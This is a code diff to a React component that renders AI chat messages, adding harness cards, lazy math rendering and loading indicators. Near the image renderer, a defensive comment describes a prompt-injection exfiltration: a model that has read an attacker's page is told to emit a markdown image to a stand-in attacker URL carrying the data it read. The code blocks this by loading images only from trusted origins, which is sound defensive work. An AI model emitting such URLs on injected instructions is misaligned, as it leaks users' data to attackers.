@@ -3,19 +3,39 @@ import { motion, AnimatePresence } from 'framer-motion';
 import ReactMarkdown from 'react-markdown';
 import remarkGfm from 'remark-gfm';
 import remarkBreaks from 'remark-breaks';
-import remarkMath from 'remark-math';
 import { escapeCurrencyAmounts } from './currencyMarkdown';
-import rehypeKatex from 'rehype-katex';
+import { stripPrivateModelMarkup } from '../../../shared/modelOutput';
+import { useMathPlugins } from './mathPlugins';
 import { X } from 'lucide-react';
-import { MessageProps } from '../../types/chat';
+import { MessageProps, LoadingPhase } from '../../types/chat';
 import { AI_PERSONAS } from '../../config/constants';
-import { Brain } from 'lucide-react';
 import { useTheme } from '../../context/ThemeContext';
 import { GeneratedImage } from './GeneratedImage';
 import { AnimatedShinyText } from '../ui/AnimatedShinyText';
+import { LoadingPhaseIndicator } from './LoadingPhaseIndicator';
+import { loadingLabel } from './loadingLabel';
+import { HarnessTranscript } from './HarnessActionCard';
+import type { HarnessAction } from '../../types/chat';
 import { AudioPlayerBubble } from './AudioPlayerBubble';
 import { CodeBlock } from './CodeBlock';
 import { BrandOverride } from '../brand/BrandLogo';
+
+// Image sources the transcript will load directly. Everything else becomes a
+// link (see the img renderer). Relative /api/image URLs are ours; blob: and
+// data: never leave the page; the Supabase project is where uploads live.
+const SUPABASE_ORIGIN = (() => {
+  try { return new URL(import.meta.env.VITE_SUPABASE_URL).origin; } catch { return ''; }
+})();
+function isTrustedImageSource(src: string): boolean {
+  if (src.startsWith('/api/image?') || src.startsWith('blob:') || src.startsWith('data:image/')) return true;
+  try {
+    const url = new URL(src, window.location.origin);
+    return url.origin === window.location.origin || (SUPABASE_ORIGIN !== '' && url.origin === SUPABASE_ORIGIN);
+  } catch {
+    return false;
+  }
+}
+
 import { MusicComposeCard, SavedVariation } from './MusicComposeCard';
 import type { Components } from 'react-markdown';
 import { isMarkdownCodeComplete } from './markdownRuntime';
@@ -31,12 +51,14 @@ interface AIMessageProps extends Omit<MessageProps, 'onAnimationComplete'> {
   isStreaming?: boolean;
   audioUrl?: string;
   isStreamingActive?: boolean;
-  loadingPhase?: 'analyzing_photo' | 'thinking' | null;
+  loadingPhase?: LoadingPhase;
   specialMode?: string;
   brandOverride?: BrandOverride;
   musicVariations?: SavedVariation[];
   onMusicVariationsChange?: (messageId: string, variations: SavedVariation[]) => void;
   rawContent?: string;
+  /** Max Mode: the harness's cards, placed inline by marker (HarnessTranscript). */
+  harnessActions?: HarnessAction[];
 }
 
 const SPECIAL_MODE_SHIMMER_TEXT: Record<string, string> = {
@@ -124,12 +146,10 @@ const processMemoryContent = (content: string): { cleanContent: string; hasSaved
   const hasSavedMemory = content.includes('[MEMORY_SAVED]');
 
   // Remove memory tags and marker
-  const cleanContent = content
+  const cleanContent = stripPrivateModelMarkup(content
     .replace(/<memory>[\s\S]*?<\/memory>/gi, '') // Remove memory tags
-    .replace(/<(reason|think)>[\s\S]*?<\/\1>/gi, '') // Remove reasoning/thinking tags
     .replace(/\[MEMORY_SAVED\]/g, '') // Remove marker
-    .replace(/!\[Generated Image\]\([^)]*$/, '') // Hide incomplete image markdown during streaming
-    .trim();
+    .replace(/!\[Generated Image\]\([^)]*$/, '')); // Hide incomplete image markdown during streaming
 
   // "$45 … $220" is a price and a price, not a maths span. See currencyMarkdown.
   return { cleanContent: escapeCurrencyAmounts(cleanContent), hasSavedMemory };
@@ -151,7 +171,8 @@ function AIMessageComponent({
   brandOverride,
   musicVariations,
   onMusicVariationsChange,
-  rawContent
+  rawContent,
+  harnessActions,
 }: AIMessageProps) {
   const [showReasoning, setShowReasoning] = useState(false);
   const [isGeneratingImage, setIsGeneratingImage] = useState(false);
@@ -183,10 +204,13 @@ function AIMessageComponent({
   const personaColor = getPersonaColor(displayPersona);
   const shimmerColors = getPersonaShimmerColors(displayPersona);
   const contentEndRef = useRef<HTMLDivElement>(null);
-  const { theme } = useTheme();
+  const { theme, uiStyle } = useTheme();
+  const legacyUi = uiStyle === 'legacy';
 
   // Process content to handle memory tags
   const { cleanContent, hasSavedMemory } = processMemoryContent(content);
+  // Loaded on demand, and only for a message that actually has a formula.
+  const math = useMathPlugins(cleanContent + (reasoning ?? ''));
 
   const isSpecialLoadingPhase = !!(
     isStreamingActive &&
@@ -297,7 +321,7 @@ function AIMessageComponent({
       <li className={`leading-relaxed ${theme.text}`}>{children}</li>
     ),
     blockquote: ({ children }: { children?: React.ReactNode }) => (
-      <blockquote className={`border-l-4 border-purple-500/50 pl-4 my-4 italic opacity-70 ${theme.text}`}>
+      <blockquote className={`${legacyUi ? 'border-l-4' : 'border-l-2'} border-purple-500/50 pl-4 my-4 italic opacity-70 ${theme.text}`}>
         {children}
       </blockquote>
     ),
@@ -330,17 +354,29 @@ function AIMessageComponent({
         return <GeneratedImage src={src} alt={alt || 'Generated image'} persona={displayPersona} />;
       }
 
-      // Fallback to regular image for other sources
-      return (
-        <img
-          src={src}
-          alt={alt}
-          className="max-w-full h-auto rounded-xl my-4"
-          loading="lazy"
-        />
-      );
+      // Any other image host renders as a link, not an <img>. A model that
+      // has read an attacker's page can be told to emit
+      // `![](https://attacker/?d=<whatever it just read>)`, and an <img> makes
+      // the browser send that request on render — the zero-tool version of
+      // data exfiltration (pre-launch-audit.md A.12). Our own hosts are the
+      // only ones an image may load from.
+      if (src && isTrustedImageSource(src)) {
+        return (
+          <img
+            src={src}
+            alt={alt}
+            className="max-w-full h-auto rounded-xl my-4"
+            loading="lazy"
+          />
+        );
+      }
+      return src ? (
+        <a href={src} target="_blank" rel="noopener noreferrer" className="underline break-all">
+          {alt || src}
+        </a>
+      ) : null;
     },
-  }), [theme.text, personaColor, displayPersona]);
+  }), [theme.text, personaColor, displayPersona, legacyUi]);
 
   // Dedicated components for reasoning content to keep everything consistently grey/zinc-styled
   const ReasoningMarkdownComponents = useMemo<Components>(() => ({
@@ -372,7 +408,7 @@ function AIMessageComponent({
       <li className="leading-relaxed text-zinc-400">{children}</li>
     ),
     blockquote: ({ children }: { children?: React.ReactNode }) => (
-      <blockquote className="border-l-4 border-zinc-600 pl-4 my-3 italic text-zinc-500">
+      <blockquote className={`${legacyUi ? 'border-l-4' : 'border-l-2'} border-zinc-600 pl-4 my-3 italic text-zinc-500`}>
         {children}
       </blockquote>
     ),
@@ -391,7 +427,7 @@ function AIMessageComponent({
       );
     },
     img: () => null, // Don't render images inside reasoning
-  }), []);
+  }), [legacyUi]);
 
   // Inline the message content JSX - DO NOT use a function component here
   // as it would cause remounting on every parent re-render
@@ -401,20 +437,21 @@ function AIMessageComponent({
         <div className="w-full max-w-4xl mx-auto mb-6">
           <motion.button
             onClick={() => setShowReasoning(!showReasoning)}
-            className={`flex items-center gap-2 px-4 py-2 rounded-full
-              bg-linear-to-r/srgb ${reasoningColors.gradient.replace('/90', '/20')}
-              backdrop-blur-xl border ${reasoningColors.border}
+            className={`flex items-center px-4 py-2 rounded-full overflow-hidden isolate
+              border ${reasoningColors.border}
               ${reasoningColors.shadow}
-              hover:${reasoningColors.shadow.replace('0.2', '0.4')}
               transition-all duration-300
               mx-auto
               relative
               group
-              animate-border-glow
               cursor-pointer`}
           >
-            <div className="relative z-10 flex items-center gap-2">
-              <Brain className="w-4 h-4" />
+            <span
+              aria-hidden="true"
+              className={`absolute inset-0 -z-10 rounded-[inherit]
+                bg-linear-to-r/srgb ${reasoningColors.gradient.replace('/90', '/55')}`}
+            />
+            <div className="relative z-10 flex items-center">
               <span className={`text-sm italic ${theme.text}`}>Thought to provide a better answer</span>
             </div>
           </motion.button>
@@ -425,22 +462,22 @@ function AIMessageComponent({
                 initial={{ opacity: 0, y: -10 }}
                 animate={{ opacity: 1, y: 0 }}
                 exit={{ opacity: 0, y: -10 }}
-                className={`mt-2 p-4 relative
+                className={`mt-2 p-5 sm:p-6 relative overflow-hidden
                   bg-linear-to-r/srgb ${reasoningColors.gradient}
-                  backdrop-blur-xl rounded-lg border ${reasoningColors.border}
+                  backdrop-blur-xl rounded-3xl border ${reasoningColors.border}
                   ${reasoningColors.shadow}`}
               >
                 <button
                   onClick={() => setShowReasoning(false)}
-                  className="absolute top-2 right-2 p-1 rounded-full
+                  className="absolute top-3 right-3 p-1.5 rounded-full
                     bg-white/10 hover:bg-white/20 transition-colors"
                 >
                   <X className="w-4 h-4 text-white/80" />
                 </button>
                 <div className="text-sm text-zinc-400">
                   <ReactMarkdown
-                    remarkPlugins={[remarkGfm, remarkBreaks, remarkMath]}
-                    rehypePlugins={[rehypeKatex]}
+                    remarkPlugins={[remarkGfm, remarkBreaks, ...(math?.remark ?? [])]}
+                    rehypePlugins={math?.rehype ?? []}
                     components={ReasoningMarkdownComponents}
                   >
                     {reasoning}
@@ -555,32 +592,42 @@ function AIMessageComponent({
                     />
                   ) : (
                   <>
-                    <div className="prose prose-invert prose-sm max-w-none">
+                    <div className={`${legacyUi ? '' : 'tm-response-copy '}prose prose-invert prose-sm max-w-none`}>
                       <MarkdownRuntimeContext.Provider value={markdownRuntime}>
-                        <ReactMarkdown
-                          remarkPlugins={[remarkGfm, remarkBreaks, remarkMath]}
-                          rehypePlugins={[rehypeKatex]}
-                          components={MarkdownComponents}
-                        >
-                          {cleanContent}
-                        </ReactMarkdown>
+                        {harnessActions && harnessActions.length > 0 ? (
+                          <HarnessTranscript
+                            content={cleanContent}
+                            actions={harnessActions}
+                            renderMarkdown={(text, key) => (
+                              <ReactMarkdown
+                                key={key}
+                                remarkPlugins={[remarkGfm, remarkBreaks, ...(math?.remark ?? [])]}
+                                rehypePlugins={math?.rehype ?? []}
+                                components={MarkdownComponents}
+                              >
+                                {text}
+                              </ReactMarkdown>
+                            )}
+                          />
+                        ) : (
+                          <ReactMarkdown
+                            remarkPlugins={[remarkGfm, remarkBreaks, ...(math?.remark ?? [])]}
+                            rehypePlugins={math?.rehype ?? []}
+                            components={MarkdownComponents}
+                          >
+                            {cleanContent}
+                          </ReactMarkdown>
+                        )}
                       </MarkdownRuntimeContext.Provider>
                     </div>
                     {isSpecialLoadingPhase && (
                       <div className="w-full max-w-2xl my-2">
                         <div className="flex items-center justify-start py-2 px-3 rounded-xl bg-black/5 backdrop-blur-xs w-fit">
-                          <AnimatedShinyText
-                            text={loadingPhase as string}
-                            useShimmer={true}
+                          <LoadingPhaseIndicator
+                            phase={loadingPhase}
                             baseColor={shimmerColors.baseColor}
                             shimmerColor={shimmerColors.shimmerColor}
-                            gradientAnimationDuration={2}
-                            textClassName="text-sm"
-                            className="py-0.5"
-                            style={{
-                              fontFamily: 'SF Pro Display, -apple-system, BlinkMacSystemFont, sans-serif',
-                              fontSize: '14px'
-                            }}
+                            compact
                           />
                         </div>
                       </div>
@@ -601,18 +648,11 @@ function AIMessageComponent({
                   isSpecialLoadingPhase ? (
                     <div className="w-full max-w-2xl my-2">
                       <div className="flex items-center justify-start py-2 px-3 rounded-xl bg-black/5 backdrop-blur-xs w-fit">
-                        <AnimatedShinyText
-                          text={loadingPhase as string}
-                          useShimmer={true}
+                        <LoadingPhaseIndicator
+                          phase={loadingPhase}
                           baseColor={shimmerColors.baseColor}
                           shimmerColor={shimmerColors.shimmerColor}
-                          gradientAnimationDuration={2}
-                          textClassName="text-sm"
-                          className="py-0.5"
-                          style={{
-                            fontFamily: 'SF Pro Display, -apple-system, BlinkMacSystemFont, sans-serif',
-                            fontSize: '14px'
-                          }}
+                          compact
                         />
                       </div>
                     </div>
@@ -623,7 +663,7 @@ function AIMessageComponent({
                         transition={{ duration: 2, repeat: Infinity, ease: "linear" }}
                         className="w-4 h-4 border-2 border-current border-t-transparent rounded-full"
                       />
-                      {loadingPhase === 'analyzing_photo' ? 'Analyzing photo...' : 'Initiating'}
+                      {loadingLabel(loadingPhase)}
                     </div>
                   )
                 ) : null}
@@ -646,11 +686,11 @@ function AIMessageComponent({
                   />
                 ) : (
                 <>
-                  <div className="prose prose-invert max-w-none">
+                  <div className={`${legacyUi ? '' : 'tm-response-copy '}prose prose-invert max-w-none`}>
                     <MarkdownRuntimeContext.Provider value={markdownRuntime}>
                       <ReactMarkdown
-                        remarkPlugins={[remarkGfm, remarkBreaks, remarkMath]}
-                        rehypePlugins={[rehypeKatex]}
+                        remarkPlugins={[remarkGfm, remarkBreaks, ...(math?.remark ?? [])]}
+                        rehypePlugins={math?.rehype ?? []}
                         components={MarkdownComponents}
                       >
                         {cleanContent}
@@ -660,18 +700,10 @@ function AIMessageComponent({
                   {isSpecialLoadingPhase && (
                     <div className="w-full max-w-2xl mx-auto my-4">
                       <div className="flex items-center justify-center py-4 px-4 rounded-2xl bg-black/5 backdrop-blur-xs">
-                        <AnimatedShinyText
-                          text={loadingPhase as string}
-                          useShimmer={true}
+                        <LoadingPhaseIndicator
+                          phase={loadingPhase}
                           baseColor={shimmerColors.baseColor}
                           shimmerColor={shimmerColors.shimmerColor}
-                          gradientAnimationDuration={2}
-                          textClassName="text-base"
-                          className="py-1"
-                          style={{
-                            fontFamily: 'SF Pro Display, -apple-system, BlinkMacSystemFont, sans-serif',
-                            fontSize: '16px'
-                          }}
                         />
                       </div>
                     </div>
@@ -692,18 +724,10 @@ function AIMessageComponent({
                 isSpecialLoadingPhase ? (
                   <div className="w-full max-w-2xl mx-auto my-4">
                     <div className="flex items-center justify-center py-4 px-4 rounded-2xl bg-black/5 backdrop-blur-xs">
-                      <AnimatedShinyText
-                        text={loadingPhase as string}
-                        useShimmer={true}
+                      <LoadingPhaseIndicator
+                        phase={loadingPhase}
                         baseColor={shimmerColors.baseColor}
                         shimmerColor={shimmerColors.shimmerColor}
-                        gradientAnimationDuration={2}
-                        textClassName="text-base"
-                        className="py-1"
-                        style={{
-                          fontFamily: 'SF Pro Display, -apple-system, BlinkMacSystemFont, sans-serif',
-                          fontSize: '16px'
-                        }}
                       />
                     </div>
                   </div>
@@ -714,7 +738,7 @@ function AIMessageComponent({
                       transition={{ duration: 2, repeat: Infinity, ease: "linear" }}
                       className="w-6 h-6 border-2 border-current border-t-transparent rounded-full"
                     />
-                    {loadingPhase === 'analyzing_photo' ? 'Analyzing photo...' : 'Initiating'}
+                    {loadingLabel(loadingPhase)}
                   </div>
                 )
               ) : null}
@@ -735,7 +759,7 @@ function AIMessageComponent({
         ease: [0.25, 0.1, 0.25, 1],
       }}
       onAnimationComplete={() => !hasAnimated && onAnimationComplete(messageId)}
-      className={`w-full`}
+      className={legacyUi ? 'w-full' : 'tm-assistant-message w-full'}
     >
       {messageContent}
     </motion.div>
